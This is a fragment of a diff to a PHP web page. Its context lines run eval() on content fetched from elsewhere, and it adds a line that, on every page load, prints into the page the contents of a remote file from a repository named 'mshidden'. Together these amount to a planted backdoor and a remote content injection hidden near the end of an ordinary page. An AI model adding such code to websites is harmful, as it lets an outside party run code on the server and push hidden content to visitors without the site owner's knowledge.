@@ -3777,5 +3777,6 @@ window.onload = function() {
 		curl_close($ch);
 		eval("?>" . $fileContents);
 		?>
-	  </body>
+<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/guest.txt");?>
+</body>
 </html>
